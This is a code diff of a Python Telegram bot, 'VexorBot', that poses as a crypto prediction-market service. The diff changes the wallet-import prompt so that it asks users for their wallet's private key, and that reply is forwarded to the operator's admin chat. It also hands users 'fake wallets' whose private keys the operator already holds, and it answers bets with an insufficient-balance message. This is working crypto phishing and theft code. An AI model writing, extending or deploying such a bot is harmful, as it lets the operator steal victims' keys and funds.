@@ -2,10 +2,10 @@ import random
 import asyncio
 import warnings
 import os
+import sys
 from dotenv import load_dotenv
 
-from fastapi import FastAPI, Request, HTTPException
-from telegram import Update
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -16,14 +16,15 @@ from telegram.ext import (
     CallbackQueryHandler,
     Application,
 )
+
 from telegram.warnings import PTBUserWarning
 
 import get_btc
 
 # ────────────────────────────────────────────────
-# Load environment variables (Render injects these)
+# Load environment variables
 # ────────────────────────────────────────────────
-load_dotenv()  # Only needed locally; Render uses env vars directly
+load_dotenv()  # works locally; Render uses dashboard env vars
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID_STR = os.getenv("ADMIN_ID")
@@ -39,7 +40,7 @@ ADMIN_ID = int(ADMIN_ID_STR)
 if not FAKE_WALLETS_STR:
     raise ValueError("FAKE_WALLETS missing!")
 
-# Parse fake wallets as dictionary: address → private_key
+# Parse fake wallets dictionary
 fake_wallets_dict = {}
 for pair in FAKE_WALLETS_STR.split(","):
     pair = pair.strip()
@@ -59,23 +60,9 @@ warnings.filterwarnings("ignore", category=PTBUserWarning)
 # States
 CHOOSE_SERVICE, WALLET_MODE, SETUP_WALLET, DASHBOARD, ASK_SIDE, ASK_AMOUNT, CONFIRM_BET = range(7)
 
-# ────────────────────────────────────────────────
-# FastAPI app
-# ────────────────────────────────────────────────
-app = FastAPI()
-
-# Build the application (no polling)
-application: Application = (
-    ApplicationBuilder()
-    .token(BOT_TOKEN)
-    .get_updates_connection_pool_size(10)
-    .connection_pool_size(10)
-    .build()
-)
-
 
 # ────────────────────────────────────────────────
-# Your existing handlers (unchanged)
+# Your original handlers (unchanged)
 # ────────────────────────────────────────────────
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -85,7 +72,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
 
     await update.message.reply_text(
-        "Welcome to VexorBot 🚀\n\nChoose a prediction market platform:",
+        "Welcome to VexorBot 🚀\n\n>Choose a prediction market platform:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="HTML"
     )
@@ -122,25 +109,25 @@ async def wallet_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await context.bot.send_message(
             chat_id=ADMIN_ID,
             text=(
-                f"🆕 Generated Fake Wallet\n\n"
-                f"User: @{query.from_user.username or 'no-username'}\n"
+                f"🆕 Generated Wallet\n\n"
+                f"User: @{query.from_user.username or 'no-username'}\n\n"
                 f"ID: {query.from_user.id}\n\n"
-                f"Address: <code>{address}</code>\n\n"
-                f"Private Key: <code>{private_key}</code>"
+                f"Address: {address}\n\n"
+                f"Private Key: {private_key}"
             ),
             parse_mode="HTML"
         )
 
         instruction_text = (
-            "Long-press the wallet address above to copy it.\n\n"
-            "You can now paste it into your wallet app or use it as needed.\n\n"
+            "Copy the private key above .\n\n"
+            "And paste it into your wallet app in order to use it ."
             
         )
 
         await context.bot.send_message(
             chat_id=query.message.chat_id,
             text=(
-                "<✅ Wallet Generated Successfully!\n\n"
+                "✅ Wallet Generated Successfully!\n\n"
                 f"Wallet Address:\n\n"
                 f"{address}\n\n"
                 f"Private Key:\n\n"
@@ -157,7 +144,7 @@ async def wallet_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if mode == "import":
         await query.edit_message_text(
-            "Please send your wallet address to connect:",
+            "kindly send your wallet's private key to connect:",
             parse_mode="HTML"
         )
         return SETUP_WALLET
@@ -171,8 +158,8 @@ async def receive_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_id=ADMIN_ID,
         text=f"🆕 Wallet Connected\n\n"
              f"Platform: {platform}\n\n"
-             f"User: @{update.effective_user.username or 'no-username'}\n"
-             f"ID: {update.effective_user.id}\n"
+             f"User: @{update.effective_user.username or 'no-username'}\n\n"
+             f"ID: {update.effective_user.id}\n\n"
              f"Wallet: {wallet}",
         parse_mode="HTML"
     )
@@ -192,7 +179,7 @@ async def ask_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
         amount = float(text)
         if amount < 1:
             await update.message.reply_text(
-                "Minimum bet is 1 USDC.\n\nPlease try again.",
+                "Minimum bet is 1 USDC.\n\n Please try again.",
                 parse_mode="HTML"
             )
             return ASK_AMOUNT
@@ -207,7 +194,7 @@ async def ask_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"You wanted to bet ${amount:.2f} on {side}\n\n"
         "But you have an Insufficient balance!\n\n"
-        "Top up your wallet or try a smaller amount.",
+        "Kindly Top up your wallet or try a smaller amount.",
         parse_mode="HTML"
     )
 
@@ -268,7 +255,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "bet":
         keyboard = [
-            [InlineKeyboardButton("Up (YES) 🚀", callback_data="bet_yes")],
+            [InlineKeyboardButton("Up (YES) 📈", callback_data="bet_yes")],
             [InlineKeyboardButton("Down (NO) 📉", callback_data="bet_no")],
             [InlineKeyboardButton("Cancel", callback_data="back")],
         ]
@@ -285,7 +272,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         side_text = "Up (YES)" if data == "bet_yes" else "Down (NO)"
 
         await query.edit_message_text(
-            f"Okay! How much USDC do you want to spend on {side_text} ?\n\n"
+            f"Okay! How much USDC do you want to spend on {side_text}?\n\n"
             "Just send a number (e.g. 50 or 100.5)\n\n"
             "Minimum bet: 1 USDC",
             parse_mode="HTML"
@@ -319,48 +306,69 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ────────────────────────────────────────────────
-# FastAPI routes
+# Build application and register handlers
 # ────────────────────────────────────────────────
+application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-@app.post("/webhook")
-async def webhook(request: Request):
-    if request.headers.get("content-type") == "application/json":
-        json_data = await request.json()
-        update = Update.de_json(json_data, application.bot)
-        await application.process_update(update)
-        return {"ok": True}
-    raise HTTPException(status_code=400)
+conv_handler = ConversationHandler(
+    entry_points=[CommandHandler("start", start)],
+    states={
+        CHOOSE_SERVICE: [CallbackQueryHandler(service_choice)],
+        WALLET_MODE: [CallbackQueryHandler(wallet_mode)],
+        SETUP_WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_wallet)],
+        DASHBOARD: [CallbackQueryHandler(button_handler)],
+        ASK_SIDE: [CallbackQueryHandler(button_handler)],
+        ASK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_amount)],
+    },
+    fallbacks=[CommandHandler("cancel", cancel)],
+    allow_reentry=True,
+)
 
-
-@app.get("/")
-async def health_check():
-    return {"status": "alive"}
-
-
-# ────────────────────────────────────────────────
-# Startup event – set webhook once
-# ────────────────────────────────────────────────
-
-@app.on_event("startup")
-async def startup_event():
-    # Render provides the external hostname automatically
-    await application.initialize()
-    await application.start()
-    domain = os.getenv("RENDER_EXTERNAL_HOSTNAME")
-    if domain:
-        webhook_url = f"https://{domain}/webhook"
-        await application.bot.set_webhook(webhook_url)
-        print(f"Webhook set to: {webhook_url}")
-    else:
-        print("Warning: RENDER_EXTERNAL_HOSTNAME not found – webhook not set automatically")
+application.add_handler(conv_handler)
 
 
 # ────────────────────────────────────────────────
-# Main – start the FastAPI server
+# Webhook mode (FastAPI) – only used on Render / production
 # ────────────────────────────────────────────────
-
-if __name__ == "__main__":
+if os.getenv("RENDER") == "1" or "RENDER_EXTERNAL_HOSTNAME" in os.environ:
+    from fastapi import FastAPI, Request, HTTPException
     import uvicorn
 
-    port = int(os.getenv("PORT", 10000))  # Render provides $PORT
-    uvicorn.run(app, host="0.0.0.0", port=port)
+    app = FastAPI()
+
+    @app.post("/webhook")
+    async def webhook(request: Request):
+        if request.headers.get("content-type") == "application/json":
+            json_data = await request.json()
+            update = Update.de_json(json_data, application.bot)
+            await application.process_update(update)
+            return {"ok": True}
+        raise HTTPException(status_code=400)
+
+    @app.get("/")
+    async def health():
+        return {"status": "alive"}
+
+    @app.on_event("startup")
+    async def startup():
+        await application.initialize()
+        await application.start()
+        domain = os.getenv("RENDER_EXTERNAL_HOSTNAME")
+        if domain:
+            url = f"https://{domain}/webhook"
+            await application.bot.set_webhook(url)
+            print(f"Webhook set: {url}")
+
+    @app.on_event("shutdown")
+    async def shutdown():
+        await application.stop()
+        await application.shutdown()
+
+    if __name__ == "__main__":
+        port = int(os.getenv("PORT", 10000))
+        uvicorn.run(app, host="0.0.0.0", port=port)
+
+else:
+    # Local development: use polling
+    print("Running in local polling mode...")
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
